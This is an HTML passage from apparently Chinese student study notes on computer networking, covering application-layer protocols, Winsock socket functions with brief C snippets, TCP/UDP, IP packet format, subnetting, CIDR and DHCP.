title="纯P2P结构"></a>纯P2P结构</h4><ul><li>没有永远在线的服务器</li><li>任意端系统/节点之间可以直接通讯</li><li>节点间歇性接入网络</li><li>节点可能改变IP地址</li></ul><h5 id="优点：高度可伸缩"><a href="#优点：高度可伸缩" class="headerlink" title="优点：高度可伸缩"></a>优点：高度可伸缩</h5><h5 id="缺点：难于管理"><a href="#缺点：难于管理" class="headerlink" title="缺点：难于管理"></a>缺点：难于管理</h5><h4 id="混合结构"><a href="#混合结构" class="headerlink" title="混合结构"></a>混合结构</h4><p>文件传输使用P2P结构</p><p>文件的搜索采用C/S结构—-集中式</p><ul><li>每个节点向中央服务器登记自己的内容</li><li>每个节点向中央服务器提交查询请求，查找感兴趣的内容。</li></ul><h3 id="进程："><a href="#进程：" class="headerlink" title="进程："></a>进程：</h3><p>主机上运行的程序</p><h4 id="同一主机上运行的进程之间如何通信？"><a href="#同一主机上运行的进程之间如何通信？" class="headerlink" title="同一主机上运行的进程之间如何通信？"></a>同一主机上运行的进程之间如何通信？</h4><ul><li>进程间通信机制</li><li>操作系统提供</li></ul><h4 id="不同主机上运行的进程间如何通信？"><a href="#不同主机上运行的进程间如何通信？" class="headerlink" title="不同主机上运行的进程间如何通信？"></a>不同主机上运行的进程间如何通信？</h4><p>消息交换</p><h3 id="套接字：Socket"><a href="#套接字：Socket" class="headerlink" title="套接字：Socket"></a>套接字：Socket</h3><ul><li>进程间通信利用socket发送/接受消息实现</li><li>类似于寄信</li><li>传输基础设施向进程API</li></ul><h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><ul><li>网络应用需遵循应用层协议</li><li>公开协议<ul><li>由RFC定义</li><li>允许互操作</li><li>HTTP,SMTP,….</li></ul></li><li>私有协议<ul><li>多数P2P文件共享应用</li></ul></li></ul><h3 id="应用层协议的内容"><a href="#应用层协议的内容" class="headerlink" title="应用层协议的内容"></a>应用层协议的内容</h3><ul><li>消息的类型<ul><li>请求消息</li><li>响应消息</li></ul></li><li>消息的语法/格式<ul><li>消息中有哪些字段</li><li>每个字段如何描述</li></ul></li><li>字段的语义<ul><li>字段中信息的含义</li></ul></li><li>规则<ul><li>进程何时发送/响应消息</li><li>进程如何发送/响应消息</li></ul></li></ul><h3 id="网络应用对传输服务的需求"><a href="#网络应用对传输服务的需求" class="headerlink" title="网络应用对传输服务的需求"></a>网络应用对传输服务的需求</h3><ul><li>数据丢失/可靠性<ul><li>某些网络应用能够容忍一定的数据丢失：网络电话</li><li>某些网络应用要求100%可靠的数据传输：文件传输，telnet</li></ul></li><li>时间/延迟<ul><li>有些应用只有在延迟足够低时才“有效”</li><li>网络电话/网络游戏</li></ul></li><li>带宽<ul><li>某些应用只有在带宽达到最低要求时才“有效”：网络视频</li><li>某些应用能够适应任何带宽—-弹性应用：email </li></ul></li></ul><h3 id="Internet提供的传输服务"><a href="#Internet提供的传输服务" class="headerlink" title="Internet提供的传输服务"></a>Internet提供的传输服务</h3><p>TCP服务</p><ul><li>面向连接：客户机/服务器进程间需要建立连接</li><li>可靠的传输</li><li>流量控制：发送方不会发送速度过快，超过接收方的处理能力</li><li>拥塞控制：当网络负载过过重时能够限制发送方的发送速度</li><li>不提供时间/延迟保障</li><li>不提供最小带宽保障</li></ul><p>UDP服务</p><ul><li>无连接</li><li>不可靠的数据传输</li><li>不提供：<ul><li>可靠性保障</li><li>流量控制</li><li>拥塞控制</li><li>延迟保障</li><li>带宽保障</li></ul></li></ul><h3 id="HTTP协议概述"><a href="#HTTP协议概述" class="headerlink" title="HTTP协议概述"></a>HTTP协议概述</h3><p>超文本传输协议</p><p>CS结构</p><p>HTTP版本：</p><ul><li>1.0：RFC 1945</li><li>1.1：RFC 2068</li></ul><p>使用TCP传输服务</p><ul><li>服务器在80端口等待客户的请求</li><li>浏览器发起到服务器的TCP连接（创建套接字Socket）</li><li>服务器接受来自浏览器的TCP连接</li><li>浏览器与Web服务器交换HTTP消息</li><li>关闭TCP连接</li></ul><p>无状态</p><ul><li>服务器不维护任何有关客户端过去所发请求的信息</li></ul><h3 id="HTTP连接的两种类型"><a href="#HTTP连接的两种类型" class="headerlink" title="HTTP连接的两种类型"></a>HTTP连接的两种类型</h3><p>非持久性连接</p><ul><li>每个TCP连接最多允许传输一个对象</li><li>HTTP 1.0版本使用非持久性连接</li></ul><p>持久性连接</p><ul><li>每个TCP连接允许传输多个对象</li><li>HTTP 1.1版本默认使用持久性连接</li></ul><h3 id="Web缓存-代理服务器技术"><a href="#Web缓存-代理服务器技术" class="headerlink" title="Web缓存/代理服务器技术"></a>Web缓存/代理服务器技术</h3><p>功能</p><ul><li>在不访问服务器的前提下满足客户端的HTTP请求</li></ul><p>为什么要发明这种技术？</p><ul><li>缩短客户请求的响应时间</li><li>减少机构/组织的流量</li><li>在大范围内实现有效的内容分发</li></ul><h3 id="Email应用的构成"><a href="#Email应用的构成" class="headerlink" title="Email应用的构成"></a>Email应用的构成</h3><ul><li><p>邮件客户端</p><ul><li>读写Email消息</li><li>与服务其交互。收发Email</li><li>Web客户端</li><li>outlook，gmail，foxmail</li></ul></li><li><p>邮件服务器</p><ul><li>邮箱：存储发给该用户的Email</li><li>消息队列：存储等待发送的Email</li></ul></li><li><p>STMP协议</p><ul><li>邮件服务器之间传递消息所使用的协议</li><li>客户端：发送消息的服务器</li><li>服务器：接收消息的服务器</li></ul><p>​</p></li></ul><h3 id="STMP协议"><a href="#STMP协议" class="headerlink" title="STMP协议"></a>STMP协议</h3><p>使用TCP进行email消息的可靠传输</p><p>端口25</p><p>传输过程的三个阶段</p><ul><li>握手</li><li>消息的传输 </li><li>关闭</li></ul><p>命令/相应交互模式</p><ul><li>命令：ASCII文本</li><li>响应：状态代码和语句</li></ul><p>Email消息只能包含7位ASCII码  </p><h3 id="Email消息格式"><a href="#Email消息格式" class="headerlink" title="Email消息格式"></a>Email消息格式</h3><p>头部行</p><ul><li>To</li><li>From</li><li>Subject</li></ul><p>消息体</p><ul><li>消息本身</li><li>只能是ASCII字符</li></ul><h3 id="邮件访问协议"><a href="#邮件访问协议" class="headerlink" title="邮件访问协议"></a>邮件访问协议</h3><p>邮件访问协议：从服务器获取邮件</p><ul><li>POP：Post Office Protocol<ul><li>认证/授权</li></ul></li><li>IMAP：Internet Mail Access Protocol<ul><li>更多功能</li><li>更加复杂</li><li>能够操纵服务器上存储的消息</li></ul></li><li>HTTP：163，QQ Mail等</li></ul><h4 id="POP协议"><a href="#POP协议" class="headerlink" title="POP协议"></a>POP协议</h4><p>认证过程</p><ul><li>客户端命令<ul><li>User：声明用户名</li><li>Pass： 声明密码</li></ul></li><li>服务器响应<ul><li>+OK</li><li>-ERR</li></ul></li><li>事务阶段<ul><li>List：列出消息数量</li><li>Retr：用编号获取消息</li><li>Dele：删除消息</li><li>Quit</li></ul></li></ul><h4 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h4><p>所有消息统一保存在一个地方：服务器</p><p>允许用户利用文件夹组织消息</p><p>IMAP支持跨会话的用户状态</p><ul><li>文件夹的名字</li><li>文件夹与消息ID之间的映射等</li></ul><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>Internet上主机/路由器的识别问题</p><ul><li>IP地址</li><li>域名</li></ul><p>域名解析系统DNS</p><ul><li>多层命名服务器构成的分布式数据库</li><li>应用层协议：完成名字的解析<ul><li>Internet核心功能，用应用层协议实现</li><li>网络边界复杂</li></ul></li></ul><h4 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h4><ul><li>域名向IP地址的翻译</li><li>主机别名</li><li>邮件服务器别名</li><li>负载均衡：Web服务器</li></ul><h4 id="DNS根域名服务器"><a href="#DNS根域名服务器" class="headerlink" title="DNS根域名服务器"></a>DNS根域名服务器</h4><p>本地域名解析服务器无法解析域名时，访问根域名服务器</p><p>根域名服务器</p><ul><li>如果不知道映射，访问权威域名服务器</li><li>获得映射</li><li>向本地域名服务器返回映射</li></ul><h4 id="顶级域名服务器：负责com-org-net-edu等等"><a href="#顶级域名服务器：负责com-org-net-edu等等" class="headerlink" title="顶级域名服务器：负责com,org,net,edu等等"></a>顶级域名服务器：负责com,org,net,edu等等</h4><h4 id="权威域名服务器：组织的域名解析服务器，提供组织内部服务器的解析服务"><a href="#权威域名服务器：组织的域名解析服务器，提供组织内部服务器的解析服务" class="headerlink" title="权威域名服务器：组织的域名解析服务器，提供组织内部服务器的解析服务"></a>权威域名服务器：组织的域名解析服务器，提供组织内部服务器的解析服务</h4><ul><li>组织负责维护</li><li>服务提供商负责维护</li></ul><h4 id="本地域名解析服务器"><a href="#本地域名解析服务器" class="headerlink" title="本地域名解析服务器"></a>本地域名解析服务器</h4><p>不严格属于层级体系</p><p>每个ISP有一个本地域名服务器</p><ul><li>默认域名解析服务器</li></ul><p>当主机进行DNS查询时，查询被发送到本地域名服务器</p><ul><li>作为代理，将查询传发给域名解析服务器系统</li></ul><h3 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h3><p>迭代查询</p><p>递归查询 </p><h3 id="P2P：搜索信息"><a href="#P2P：搜索信息" class="headerlink" title="P2P：搜索信息"></a>P2P：搜索信息</h3><p>文件共享（电驴）</p><ul><li>利用索引动态跟踪节点所共享的文件的位置</li><li>节点需要告诉索引它拥有哪些文件</li><li>节点搜索索引，从而获知能够得到哪些 文件</li></ul><p>即时消息（QQ）</p><ul><li>索引负责将用户名映射到位置</li><li>当用户开启IM应用时，需要通知索引它的位置</li><li>节点检索索引，确认用户的IP地址</li></ul><h4 id="集中式索引"><a href="#集中式索引" class="headerlink" title="集中式索引"></a>集中式索引</h4><h4 id="洪范式查询"><a href="#洪范式查询" class="headerlink" title="洪范式查询"></a>洪范式查询</h4><h4 id="层次式覆盖网络"><a href="#层次式覆盖网络" class="headerlink" title="层次式覆盖网络"></a>层次式覆盖网络</h4><h3 id="Socket-API函数"><a href="#Socket-API函数" class="headerlink" title="Socket API函数"></a>Socket API函数</h3><h4 id="WSAStartup函数"><a href="#WSAStartup函数" class="headerlink" title="WSAStartup函数"></a>WSAStartup函数</h4><p>使用Socket的应用程序在使用Socket之前必须首先调用WSAStartup函数</p><p>两个参数：</p><ul><li>第一个参数指明程序请求使用的WinSock版本，其中高位字节指明副版本，低位字节指明主版本。<ul><li>十六进制整数，例如0x102表示2.1版</li></ul></li><li>第二个参数返回实际的WinSock的版本信息<ul><li>指向WSADATA结构的指针</li></ul></li></ul><h4 id="WSACleanup"><a href="#WSACleanup" class="headerlink" title="WSACleanup"></a>WSACleanup</h4><ul><li>应用程序在完成对请求的Socket库的使用最后要调用WSACleanup函数</li><li>解除与Socket库的绑定</li><li>释放Socket库所占用的系统资源</li></ul><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sd = socket(protofamily,type,proto);</span><br></pre></td></tr></table></figure><ul><li><p>创建套接字</p></li><li><p>操作系统返回套接字描述符（sd）</p></li><li><p>第一份参数（协议族）：protofamily=PF_INET（TCP/IP）</p></li><li><p>第二个参数（套接字类型）：</p><p>type=SOCK_STREAM,SOCK_DGRAM or SOCK_RAW（TCP/IP）</p></li><li><p>第三个参数（协议号）：0为默认</p></li></ul><h4 id="例如：创建一个流套接字的代码段"><a href="#例如：创建一个流套接字的代码段" class="headerlink" title="例如：创建一个流套接字的代码段"></a>例如：创建一个流套接字的代码段</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">protoent</span> *<span class="title">p</span>;</span></span><br><span class="line">p=getprotobyname(<span class="string">"tcp"</span>);</span><br><span class="line">SOCKET sd=socket(PF_INET,SOCK_STREAM,p-&gt;p_proto)</span><br></pre></td></tr></table></figure><h3 id="Socket面向TCP-IP的服务类型"><a href="#Socket面向TCP-IP的服务类型" class="headerlink" title="Socket面向TCP/IP的服务类型"></a>Socket面向TCP/IP的服务类型</h3><p>TCP：可靠、面向连接、字节流传输、点对点</p><p>UDP：不可靠、无连接、数据报传输</p><h4 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(sd,localaddr,addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>绑定套接字的本地端点地址</p><ul><li>IP地址+端口号</li></ul><p>参数</p><ul><li>套接字描述符（sd）</li><li>端点地址（localaddr）</li><li>地址长度（addrlen）</li></ul><p>客户程序一般不必调用bind函数</p><p>INADDR_ANY</p><h4 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(sd,queuesize)</span></span>;</span><br></pre></td></tr></table></figure><p>置服务器端的流套接字处于监听状态</p><ul><li>仅服务器端调用</li><li>仅用于面向连接的流套接字</li></ul><p>设置连接请求队列大小（queuesize）</p><p>返回值:</p><p>0：成功</p><p>Socket_ERROR：失败</p><h4 id="connect函数"><a href="#connect函数" class="headerlink" title="connect函数"></a>connect函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect(sd,saddr,saddrlen);</span><br></pre></td></tr></table></figure><ul><li>客户程序调用connect函数来使客户套接字（sd）与特定计算机的特定端口（saddr）的套接字（服务）进行连接</li><li>仅用于客户端</li><li>可用于TCP客户端也可以用于UDP客户端<ul><li>TCP客户端：建立TCP连接</li><li>UDP客户端：指定服务器端点地址</li></ul></li></ul><h4 id="accept函数"><a href="#accept函数" class="headerlink" title="accept函数"></a>accept函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsock = accept(sd,caddr,caddrlen)</span><br></pre></td></tr></table></figure><ul><li>服务程序调用accept函数从处于监听状态的流套接字sd的客户连接请求队列中取出排在最前的一个客户请求，并且创建一个新的套接字来与客户套接字创建连接通道<ul><li>仅用于TCP套接字</li><li>仅用于服务器</li></ul></li><li>利用新创建的套接字（newsock）与客户通信</li></ul><h4 id="4种类型基本服务器"><a href="#4种类型基本服务器" class="headerlink" title="4种类型基本服务器"></a>4种类型基本服务器</h4><ul><li><p>循环无连接</p></li><li><p>循环面向连接</p></li><li><p>并发无连接</p></li><li><p>并发面向连接</p><p>​ </p></li></ul><h3 id="传输层服务和协议"><a href="#传输层服务和协议" class="headerlink" title="传输层服务和协议"></a>传输层服务和协议</h3><p>传输层协议为运行在不同Host上的进程提供了一种逻辑通信机制</p><p>端系统运行传输层协议</p><ul><li>发送方：将应用递交的消息分成一个或多个的Segment，并向下传给网络层</li><li>接收方：将接收到的segment组装成消息，并向上交给应用层</li></ul><p>传输层可以为应用提供多种协议</p><ul><li>Internet上的TCP</li><li>Internet上的UDP</li></ul><h4 id="网络层：提供主机之间的逻辑通信机制"><a href="#网络层：提供主机之间的逻辑通信机制" class="headerlink" title="网络层：提供主机之间的逻辑通信机制"></a>网络层：提供主机之间的逻辑通信机制</h4><h4 id="传输层：提供应用进程之间的逻辑通信机制"><a href="#传输层：提供应用进程之间的逻辑通信机制" class="headerlink" title="传输层：提供应用进程之间的逻辑通信机制"></a>传输层：提供应用进程之间的逻辑通信机制</h4><ul><li>位于网络层之上</li><li>依赖于网络层服务</li><li>对网络层服务进行增强</li></ul><h3 id="多路复用-分用"><a href="#多路复用-分用" class="headerlink" title="多路复用/分用"></a>多路复用/分用</h3><p>接收端进行多路分用：传输层依据头部信息将收到的Segment交给正确的Socket，即不同的进程</p><p>发送端进行多路复用：从多个Socket接收数据，为每块数据封装上头部信息，生成Segment，交给网络层。</p><h4 id="分用如何工作？"><a href="#分用如何工作？" class="headerlink" title="分用如何工作？"></a>分用如何工作？</h4><p>主机接收到IP数据报（datagram）</p><ul><li>每个数据报携带源IP地址，目的IP地址</li><li>每个数据报携带一个传输层的段（Segment）</li><li>每个段携带源端口号和目的端口号</li></ul><p>主机收到Segment之后，传输层协议提取IP地址和端口号信息，将Segment导向相应的Socket</p><ul><li>TCP做更多处理</li></ul><h4 id="无连接分用（面向UDP）"><a href="#无连接分用（面向UDP）" class="headerlink" title="无连接分用（面向UDP）"></a>无连接分用（面向UDP）</h4><ul><li>利用端口号创建Socket</li><li>UDP的Socket用二元组标识（目的IP地址，目的端口号）</li><li>主机收到UDP段后<ul><li>检查段中的目的端口号</li><li>将UDP段导向绑定在该端口号的Socket</li></ul></li><li>来自不同源IP地址和/或源端口号的IP数据包被导向同一个Socket</li></ul><h4 id="面向连接的分用（面向TCP）"><a href="#面向连接的分用（面向TCP）" class="headerlink" title="面向连接的分用（面向TCP）"></a>面向连接的分用（面向TCP）</h4><ul><li>TCP的Socket用四元组标识<ul><li>源IP地址</li><li>源端口号</li><li>目的IP地址</li><li>目的端口号</li></ul></li><li>接收端利用所有的四个值将Segment导向合适的Socket</li><li>服务器可能同时支持多个TCP Socket<ul><li>每个Socket用自己的四元组标识</li></ul></li><li>web服务器为每个客户端开不同的Socket</li></ul><h3 id="UDP（用户数据报协议）"><a href="#UDP（用户数据报协议）" class="headerlink" title="UDP（用户数据报协议）"></a>UDP（用户数据报协议）</h3><p>基于Internet IP协议</p><ul><li>复用/分用</li><li>简单的错误校验</li></ul><p>“Best effort” 服务，UDP段可能</p><ul><li>丢失</li><li>非按序到达</li></ul><p>无连接</p><ul><li>UDP发送方和接收方之间不需要握手</li><li>每个UDP段的处理独立于其他段</li></ul><h4 id="UDP为什么存在？"><a href="#UDP为什么存在？" class="headerlink" title="UDP为什么存在？"></a>UDP为什么存在？</h4><ul><li>无需建立连接（减少延迟）</li><li>实现简单：无需维护连接状态</li><li>头部开销少</li><li>没有拥塞控制：应用可更好地控制发送时间和速率 </li></ul><h3 id="TCP概述"><a href="#TCP概述" class="headerlink" title="TCP概述"></a>TCP概述</h3><p>点对点</p><ul><li>一个发送方，一个接收方</li></ul><p>可靠的，按序的字节流</p><p>流水线机制</p><ul><li>TCP拥塞控制和流量控制机制，设置窗口尺寸</li></ul><p>发送方/接收方缓存</p><p>全双工</p><ul><li>同一连接中能够传输双向数据流</li></ul><p>面向连接</p><ul><li>通信双方在发送数据之前必须建立连接</li><li>连接状态只在连接的两端中维护，在沿途节点中并不维护状态</li><li>TCP连接包括：两台主机上的缓存，连接状态变量，socket等</li></ul><p>流量控制机制</p><h3 id="TCP可靠数据传输概述"><a href="#TCP可靠数据传输概述" class="headerlink" title="TCP可靠数据传输概述"></a>TCP可靠数据传输概述</h3><p>TCP在IP层提供的不可靠服务基础上实现可靠数据传输服务</p><p>流水线机制</p><p>累积确认</p><p>TCP使用单一重传定时器</p><p>触发重传的事件</p><ul><li>超时</li><li>收到重复ACK</li></ul><p>渐进式</p><ul><li>暂不考虑重复ACK</li><li>暂不考虑流量控制</li><li>暂不考虑拥塞控制 </li></ul><h3 id="拥塞控制原理"><a href="#拥塞控制原理" class="headerlink" title="拥塞控制原理"></a>拥塞控制原理</h3><p>拥塞的表现</p><ul><li>分组丢失（路由器缓存溢出）</li><li>分组延迟过大（在路由器缓存中排队）</li></ul><p>拥塞控制的方法</p><ul><li>端到端拥塞控制：<ul><li>网络层不需要显式的提供支持</li><li>端系统通过观察loss，delay等网络行为判断是否发生拥塞</li><li>TCP采取这种方法</li></ul></li><li>网络辅助的拥塞控制<ul><li>路由器向发送方显式地反馈网络拥塞信息</li><li>简单的拥塞指示：SNA,DECbit,TCP/IP ECN,ATM</li><li>指示发送方应该采取何种速率</li></ul></li></ul><h3 id="网络层服务"><a href="#网络层服务" class="headerlink" title="网络层服务"></a>网络层服务</h3><ul><li>从发送主机向接受主机传送数据段</li><li>发送主机：将数据段封装到数据报中</li><li>接受主机：向传输层交付数据段</li><li>每个主机和路由器都运行网络层协议</li><li>路由器检验所有穿越它的IP数据报的头部域<ul><li>决策如何处理IP数据报</li></ul></li></ul><h3 id="网络层核心功能-转发与路由"><a href="#网络层核心功能-转发与路由" class="headerlink" title="网络层核心功能-转发与路由"></a>网络层核心功能-转发与路由</h3><p>转发：将分组从路由器的输入端口转移到合适的输出端口</p><p>路由：确定分组从源到目的经过的路径</p><ul><li>路由算法</li></ul><h3 id="网络层核心功能-连接建立"><a href="#网络层核心功能-连接建立" class="headerlink" title="网络层核心功能-连接建立"></a>网络层核心功能-连接建立</h3><p>某些网络的重要功能</p><ul><li>ATM，帧中继X.25</li></ul><p>数据分组传输之前两端主机需要首先建立虚拟/逻辑连接</p><ul><li>网络设备（如路由器）参与连接的建立</li></ul><p>网络层连接与传输层连接的对比</p><ul><li>网络层连接：两个主机之间（路径上的路由器等设备参与其中）</li><li>传输层连接：两个应用进程之间（对中间网络设备透明） </li></ul><h3 id="网络层服务模型"><a href="#网络层服务模型" class="headerlink" title="网络层服务模型"></a>网络层服务模型</h3><p>无连接服务</p><ul><li>不事先为系列分组的传输确定传输路径</li><li>每个分组独立确定传输路径</li><li>不同分组可能传输路径不同</li><li>数据报网络</li></ul><p>连接服务</p><ul><li>首先为系列分组的传输确定从源到目的经过的路径（建立连接）</li><li>然后沿该路径（连接）传输系列分组</li><li>系列分组传输路径相同</li><li>传输结束后拆除连接</li><li>虚电路网络</li></ul><h3 id="连接服务与无连接服务"><a href="#连接服务与无连接服务" class="headerlink" title="连接服务与无连接服务"></a>连接服务与无连接服务</h3><p>数据报网络和虚电路网络是典型两类分组交换网络</p><p>数据报网路提供网络层无连接服务</p><p>虚电路网络提供网络层连接服务</p><p>类似于传输层的无连接服务（UDP）和面向连接服务（TCP）但是网络层服务：</p><ul><li>主机到主机服务</li><li>网络核心实现</li></ul><h4 id="虚电路"><a href="#虚电路" class="headerlink" title="虚电路"></a>虚电路</h4><p>虚电路：一条从源主机到目的主机，类似于电路的路径（逻辑连接）</p><ul><li>分组交换</li><li>每个分组的传输利用链路的全部带宽</li><li>源到目的路径经过的网络层设备共同完成虚电路功能</li></ul><p>通信过程：呼叫建立—&gt;数据传输—&gt;拆除呼叫</p><p>每个分组携带虚电路标识（VCID），而不是目的主机地址</p><p>虚电路经过的每个网络设备（如路由器）维护每条经过它的虚电路连接状态</p><p>链路，网络设备资源（如带宽，缓存等）可以面向VC进行预分配</p><ul><li>预分配资源=可预期服务性能</li><li>如ATM的电路仿真（CBR）</li></ul><h4 id="VC的具体实现"><a href="#VC的具体实现" class="headerlink" title="VC的具体实现"></a>VC的具体实现</h4><p>每条虚电路包括：</p><p>1：从源主机到目的主机的一条路径</p><p>2：虚电路号（VCID），沿路每段链路一个编号</p><p>3：沿路每个网络层设备（如路由器），利用转发表记录经过的每条虚电路</p><p>沿某条虚电路传输的分组，携带对应虚电路的VCID，而不是目的地址</p><p>同一条VC，在每段链路上的VCID通常不同</p><ul><li>路由器传发分组时一句转发表改写/替换虚电路号</li></ul><h4 id="虚电路信令协议"><a href="#虚电路信令协议" class="headerlink" title="虚电路信令协议"></a>虚电路信令协议</h4><p>用于VC的建立，维护与拆除</p><ul><li>路径选择</li></ul><p>应用于虚电路网络</p><ul><li>如ATM，帧中继网络等</li></ul><p>目前的Internet不采用</p><h3 id="数据报网络"><a href="#数据报网络" class="headerlink" title="数据报网络"></a>数据报网络</h3><p>网络层无连接</p><p>每个分组携带目的地址</p><p>路由器根据分组的目的地址转发分组</p><ul><li>基于路由协议/算法构建转发表</li><li>检索转发表</li><li>每个分组独立选路</li></ul><h3 id="IP分组格式"><a href="#IP分组格式" class="headerlink" title="IP分组格式"></a>IP分组格式</h3><p>版本号字段占4位：IP协议的版本号</p><p>首部长度字段占4位：IP分组首部长度</p><ul><li>以4字节为单位</li></ul><p>服务类型（TOS）字段占8位：指示期望获得哪种类型的服务</p><ul><li>1998年这个字段改名为区分服务</li><li>只有在网络提供区分服务时使用</li><li>一般情况下不使用，通常IP分组的该字段（第2字节）的值为00H</li></ul><p>总长度字段占16位：IP分组的总字节数（首部+数据）</p><ul><li>最大IP分组的总长度：65535B</li><li>最小的IP分组首部：20B</li><li>IP分组可以封装的最大数据：65535-20=65515B</li></ul><p>生存时间（TTL）字段占8位：IP分组在网络中可以通过的路由器数（或跳步数）</p><ul><li>路由器转发一次分组，TTL减1</li><li>如果TTL=0，路由器则丢弃该IP分组</li></ul><p>协议字段占8位：指示IP分组封装的是哪个协议的数据包</p><ul><li>实现复用/分解</li><li>6为TCP,表示封装的为TCP段，17为UDP，表示封装的是UDP数据报</li></ul><p>首部校验和字段占16位：实现对IP分组首部的差错检测</p><ul><li>计算校验和时，该字段置全0</li><li>采用反码算术运算求和，和的反码作为首部校验和字段</li></ul><p>源IP地址，目的IP地址字段各占32位：分别标识发送分组的源主机/路由器（网络接口）和接受分组的目的主机/路由器（网络接口）的IP地址</p><p>选项字段占长度可变，范围在1~40B之间：携带安全，源选路径，时间戳和路由记录等内容</p><ul><li>实际上很少被使用</li></ul><p>填充字段占长度可变，范围在0~3B之间：目的是补齐整个首部，符合32位对齐，即保证首部长度是四字节的倍数</p><h3 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h3><h4 id="最大传输单元（MTU）"><a href="#最大传输单元（MTU）" class="headerlink" title="最大传输单元（MTU）"></a>最大传输单元（MTU）</h4><p>网络链路存在MTU（最大传输单元）-链路层数据帧可封装数据的上限</p><p>大IP分组向较小MTU链路转发时，可以被”分片“</p><ul><li>1个IP分组分为多片IP分组</li><li>IP分片到达目的主机后进行重组</li></ul><p>IP首部的相关字段用于标识分片以及确定分片的相对顺序</p><h4 id="IP分片过程"><a href="#IP分片过程" class="headerlink" title="IP分片过程"></a>IP分片过程</h4><ul><li>假设原IP分组总长度为L，待转发链路的MTU为M</li><li>若L&gt;M，且DF=0，则可以/需要分片</li><li>分片时每个分片的标识复制原IP分组的标识</li><li>通常分片时，除最后一个分片，其他分片均分为MTU允许的最大分片</li></ul><h3 id="IP编址"><a href="#IP编址" class="headerlink" title="IP编址"></a>IP编址</h3><p>IP分组：</p><ul><li>源地址-从哪儿来</li><li>目的地址-到哪儿去</li></ul><p>接口：主机/路由器与物理链接的连接</p><ul><li>实现网络层功能</li><li>路由器通常由多个接口</li><li>主机通常只有一个或两个接口</li></ul><p>IP地址：32比特（IPv4）编号标识主机，路由器的接口</p><p>IP地址与每个接口关联</p><p><img src="/17/计算机网络学习笔记/1.png" alt="1"></p><p><img src="/17/计算机网络学习笔记/2.png" alt="2"></p><p><img src="/17/计算机网络学习笔记/3.png" alt="3"></p><h4 id="IP子网"><a href="#IP子网" class="headerlink" title="IP子网"></a>IP子网</h4><p>IP地址：</p><p>网络号—高比特位</p><p>主机号—低比特位</p><p>|NetID|HostID|</p><h4 id="IP子网-1"><a href="#IP子网-1" class="headerlink" title="IP子网"></a>IP子网</h4><ul><li>IP地址具有相同网络号的设备接口</li><li>不跨越路由器（第三及以上层网络设备）可以彼此物理联通的接口</li></ul><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><p>IP地址：</p><p>网络号—高位比特</p><p>子网号—原网络主机号部分比特</p><p>主机号—低位比特</p><p>|NetID|SubID|HostID|</p><h3 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h3><p>形如IP地址</p><ul><li>32位</li><li>点分十进制形式</li></ul><p>取值</p><ul><li>NetID，SubID位全取1</li><li>HostID位全取0</li></ul><p>例如</p><ul><li>A类网的默认子网掩码为：255.0.0.0</li><li>B类网的默认子网掩码为：255.255.0.0</li><li>C类网的默认子网掩码为：255.255.255.0</li><li>借用3比特划分子网的B网的子网掩码为：255.255.224.0</li></ul><h3 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h3><p>无类域间路由</p><ul><li>消除传统的A类，B类和C类地址界限<ul><li>NetID+SubID—&gt;Network Prefix(Prefix)可以任意长度</li></ul></li><li>融合子网地址与子网掩码，方便子网划分<ul><li>无类地址格式：a,b,c,d/x,其中x为前缀长度</li></ul></li></ul><h3 id="CIDR与路由聚合"><a href="#CIDR与路由聚合" class="headerlink" title="CIDR与路由聚合"></a>CIDR与路由聚合</h3><p>无类域间路由</p><ul><li>提高IPv4地址空间分配效率</li><li>提高路由效率<ul><li>将多个子网聚合为一个较大的子网</li><li>构造超网</li><li>路由聚合</li></ul></li></ul><h3 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h3><p>如何获得IP地址</p><ul><li>硬编码<ul><li>静态配置 </li></ul></li></ul><p>动态主机配置协议–DHCP</p><ul><li>从服务器动态获取<ul><li>IP地址</li><li>子网掩码</li><li>默认网关地址</li><li>DNS服务器名称和IP地址</li></ul></li><li>”即插即用“</li><li>允许地址重用 </li><li>支持在用地址续租</li><li>支持移动用户加入网络</li></ul><h4 id="动态主机配置协议（DHCP）"><a href="#动态主机配置协议（DHCP）" class="headerlink" title="动态主机配置协议（DHCP）"></a>动态主机配置协议（DHCP）</h4><p>主机广播 “DHCP discover”（发现报文）</p><p>DHCP服务器利用 “DHCP offer”（提供报文）进行相应</p><p>主机请求IP地址：“DHCP request”（请求报文）</p><p>DHCP服务器分配IP地址：“DHCP ack”（确认报文）</p><h4 id="DHCP工作过程："><a href="#DHCP工作过程：" class="headerlink" title="DHCP工作过程："></a>DHCP工作过程：</h4><p><img src="/17/计算机网络学习笔记/4.png" 